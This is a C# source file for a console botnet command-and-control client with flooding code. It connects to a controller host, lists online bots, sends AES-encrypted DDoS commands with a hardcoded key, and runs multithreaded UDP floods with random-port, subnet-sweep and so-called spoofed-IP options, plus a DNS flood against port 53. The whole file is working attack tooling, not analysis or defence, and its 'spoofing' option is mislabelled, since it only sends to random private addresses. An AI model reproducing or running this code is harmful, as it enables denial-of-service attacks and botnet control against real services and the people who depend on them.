using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;

namespace DDOS_Attack
{
    class Program
    {
        const int BUFFER_SIZE = 1024;
        const string SPOOF_IP_RANGE = "192.168.1.";

        static string GenerateRandomIP()
        {
            Random rnd = new Random();
            int randomNum = rnd.Next(1, 254);

            string ip = SPOOF_IP_RANGE + randomNum.ToString();
            return ip;
        }

        static byte[] GenerateRandomData(int size)
        {
            byte[] data = new byte[size];
            new Random().NextBytes(data);
            return data;
        }

        static void DDOSAttack(string targetIP, int targetPort, int numConnections, bool useSubnet, bool useRandomPort, bool useSpoofedIP, int attackDuration)
        {
            ManualResetEvent attackFinished = new ManualResetEvent(false);

            List<Thread> threads = new List<Thread>();

            for (int i = 0; i < numConnections; i++)
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        Random rnd = new Random();
                        using (UdpClient udpClient = new UdpClient())
                        {
                            string ipToAttack = targetIP;
                            int portToAttack = targetPort;

                            if (useSubnet)
                            {
                                ipToAttack = targetIP.Substring(0, targetIP.LastIndexOf('.') + 1) + rnd.Next(1, 254);
                            }

                            DateTime endTime = DateTime.Now.AddSeconds(attackDuration);

                            while (DateTime.Now < endTime)
                            {
                                if (useRandomPort)
                                {
                                    portToAttack = rnd.Next(1, 65535);
                                }

                                byte[] data = GenerateRandomData(BUFFER_SIZE);

                                if (useSpoofedIP)
                                {
                                    string spoofedIP = GenerateRandomIP();
                                    IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(spoofedIP), portToAttack);
                                    udpClient.Send(data, data.Length, endPoint);
                                }
                                else
                                {
                                    udpClient.Send(data, data.Length, ipToAttack, portToAttack);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error: " + ex.Message);
                    }
                    finally
                    {
                        attackFinished.Set();
                    }
                });

                thread.Start();
                threads.Add(thread);
            }

            foreach (Thread thread in threads)
            {
                thread.Join();
            }

            attackFinished.WaitOne();
        }

        static void DNS_DDOSAttack(string targetIP, int numRequests, int attackDuration)
        {
            try
            {
                using (UdpClient udpClient = new UdpClient())
                {
                    IPAddress[] addresses = Dns.GetHostAddresses(targetIP);
                    if (addresses.Length > 0)
                    {
                        IPEndPoint dnsEndPoint = new IPEndPoint(addresses[0], 53);
                        Random rnd = new Random();

                        DateTime endTime = DateTime.Now.AddSeconds(attackDuration);

                        while (DateTime.Now < endTime)
                        {
                            for (int i = 0; i < numRequests; i++)
                            {
                                byte[] data = GenerateRandomData(BUFFER_SIZE);
                                udpClient.Send(data, data.Length, dnsEndPoint);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Clear(); // Clear screen

            // Display ASCII art
            Console.WriteLine(" ___  __    ___  ___  ________      ___    ___ ________  ________  ________     ");
            Console.WriteLine(@"|\  \|\  \ |\  \|\  \|\_____  \    |\  \  /  /|\   __  \|\   __  \|\  ___  \    ");
            Console.WriteLine(@"\ \  \/  /|\ \  \\\  \\|___/  /|   \ \  \/  / | \  \|\  \ \  \|\  \ \____   \   ");
            Console.WriteLine(@" \ \   ___  \ \  \\\  \   /  / /    \ \    / / \ \   __  \ \  \\\  \|____|\  \  ");
            Console.WriteLine(@"  \ \  \\ \  \ \  \\\  \ /  /_/__    \/  /  /   \ \  \ \  \ \  \\\  \  __\_\  \ ");
            Console.WriteLine(@"   \ \__\\ \__\ \_______\\________\__/  / /      \ \__\ \__\ \_______\|\_______\");
            Console.WriteLine(@"    \|__| \|__|\|_______|\|_______|\___/ /        \|__|\|__|\|_______|\|_______|");
            Console.WriteLine(@"                                  \|___|/                                        ");

            Console.WriteLine(); // Add a blank line for spacing

            string botnetHost = null;
            string botnetIP = null;
            int botnetPort = 0;

            while (true)
            {
                if (botnetHost == null)
                {
                    Console.WriteLine("Botnet Command Menu:");
                    Console.WriteLine("1. Connect to Botnet");
                    Console.WriteLine("2. Exit");
                    Console.Write("Enter your choice: ");
                    string choice = Console.ReadLine();

                    switch (choice)
                    {
                        case "1":
                            ConnectToBotnet(out botnetHost, out botnetIP, out botnetPort);
                            break;
                        case "2":
                            Console.WriteLine("Exiting...");
                            return;
                        default:
                            Console.WriteLine("Invalid choice. Please enter a valid option.");
                            break;
                    }
                }
                else
                {
                    Console.WriteLine("Botnet Command Menu:");
                    Console.WriteLine("1. Start UDP DDOS Attack");
                    Console.WriteLine("2. Start DNS DDOS Attack");
                    Console.WriteLine("3. Check Online Bots");
                    Console.WriteLine("4. Shutdown Botnet");
                    Console.WriteLine("5. Disconnect from Botnet");
                    Console.WriteLine("6. Exit");

                    Console.Write("Enter your choice: ");
                    string choice = Console.ReadLine();

                    switch (choice)
                    {
                        case "1":
                            StartDDOSAttackThroughC2(botnetIP, botnetPort);
                            break;
                        case "2":
                            StartDNSDDOSAttack();
                            break;
                        case "3":
                            CheckOnlineBots(botnetIP, botnetPort);
                            break;
                        case "4":
                            Console.WriteLine("Shutting down botnet...");
                            break;
                        case "5":
                            botnetHost = null;
                            botnetIP = null;
                            botnetPort = 0;
                            Console.WriteLine("Disconnected from botnet.");
                            break;
                        case "6":
                            Console.WriteLine("Exiting...");
                            return;
                        default:
                            Console.WriteLine("Invalid choice. Please enter a valid option.");
                            break;
                    }
                }

                Console.WriteLine();
            }
        }

        static void ConnectToBotnet(out string botnetHost, out string botnetIP, out int botnetPort)
        {
            botnetHost = GetValidHostname("Enter the botnet controller host name: ");
            botnetIP = ResolveHostnameToIP(botnetHost);
            botnetPort = GetValidPort("Enter the botnet controller port: ");

            try
            {
                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
                using (NetworkStream stream = client.GetStream())
                {
                    Console.WriteLine("Connected to botnet controller.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error connecting to botnet: " + ex.Message);
            }
        }

        static void CheckOnlineBots(string botnetIP, int botnetPort)
        {
            try
            {
                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] data = Encoding.ASCII.GetBytes("GET ONLINE_BOTS");
                    stream.Write(data, 0, data.Length);

                    byte[] buffer = new byte[1024];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                    Console.WriteLine("Online Bots:");
                    Console.WriteLine(response);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error checking online bots: " + ex.Message);
            }
        }

        static void SendDDOSAttackCommand(NetworkStream stream)
        {
            string targetIP = GetValidIPAddress("Enter the target IP address: ");
            int targetPort = GetValidPort("Enter the target port: ");
            int numConnections = GetValidNumber("Enter the number of connections: ");
            bool useSubnet = GetValidBoolean("Use SUBNET option (true/false): ");
            bool useRandomPort = GetValidBoolean("Use RANDOM PORT option (true/false): ");
            bool useSpoofedIP = GetValidBoolean("Use SPOOFED IP option (true/false): ");
            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");

            // Encrypt the command before sending
            string command = $"DDOS_ATTACK {targetIP} {targetPort} {numConnections} {useSubnet} {useRandomPort} {useSpoofedIP} {attackDuration}";
            byte[] encryptedData = EncryptionHelper.Encrypt(command);
            stream.Write(encryptedData, 0, encryptedData.Length);
        }

        static void StartDNSDDOSAttack()
        {
            string targetIP = GetValidIPAddress("Enter the target IP address: ");
            int numRequests = GetValidNumber("Enter the number of DNS requests to send: ");
            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");

            DNS_DDOSAttack(targetIP, numRequests, attackDuration);
        }

        static void StartDDOSAttackThroughC2(string botnetIP, int botnetPort)
        {
            try
            {
                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
                using (NetworkStream stream = client.GetStream())
                {
                    Console.WriteLine("Connected to botnet controller.");

                    SendDDOSAttackCommand(stream);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error connecting to botnet: " + ex.Message);
            }
        }

        static void SendCommand(NetworkStream stream, string command)
        {
            byte[] data = Encoding.ASCII.GetBytes(command);
            stream.Write(data, 0, data.Length);
        }

        static string ResolveHostnameToIP(string hostname)
        {
            try
            {
                IPAddress[] addresses = Dns.GetHostAddresses(hostname);
                if (addresses.Length > 0)
                {
                    return addresses[0].ToString();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error resolving hostname: " + ex.Message);
            }
            return null;
        }

        static string GetValidHostname(string prompt)
        {
            while (true)
            {
                Console.Write(prompt);
                string input = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(input))
                {
                    return input;
                }
                else
                {
                    Console.WriteLine("Hostname cannot be empty. Please enter a valid hostname.");
                }
            }
        }

        static string GetValidIPAddress(string prompt)
        {
            while (true)
            {
                Console.Write(prompt);
                string input = Console.ReadLine();

                if (IPAddress.TryParse(input, out IPAddress ipAddress))
                {
                    return ipAddress.ToString();
                }
                else
                {
                    Console.WriteLine("Invalid IP address. Please enter a valid IP address.");
                }
            }
        }

        static int GetValidPort(string prompt)
        {
            while (true)
            {
                Console.Write(prompt);
                string input = Console.ReadLine();

                if (int.TryParse(input, out int port) && port > 0 && port <= 65535)
                {
                    return port;
                }
                else
                {
                    Console.WriteLine("Invalid port. Please enter a valid integer port number between 1 and 65535.");
                }
            }
        }

        static int GetValidNumber(string prompt)
        {
            while (true)
            {
                Console.Write(prompt);
                string input = Console.ReadLine();

                if (int.TryParse(input, out int number) && number > 0)
                {
                    return number;
                }
                else
                {
                    Console.WriteLine("Invalid number. Please enter a valid positive integer.");
                }
            }
        }

        static bool GetValidBoolean(string prompt)
        {
            while (true)
            {
                Console.Write(prompt);
                string input = Console.ReadLine();

                if (bool.TryParse(input, out bool result))
                {
                    return result;
                }
                else
                {
                    Console.WriteLine("Invalid input. Please enter 'true' or 'false'.");
                }
            }
        }
    }

    static class EncryptionHelper
    {
        // Use a secure key and IV
        private static readonly byte[] Key = new byte[] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };
        private static readonly byte[] IV = new byte[] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };

        public static byte[] Encrypt(string plainText)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return msEncrypt.ToArray();
                    }
                }
            }
        }
    }
}
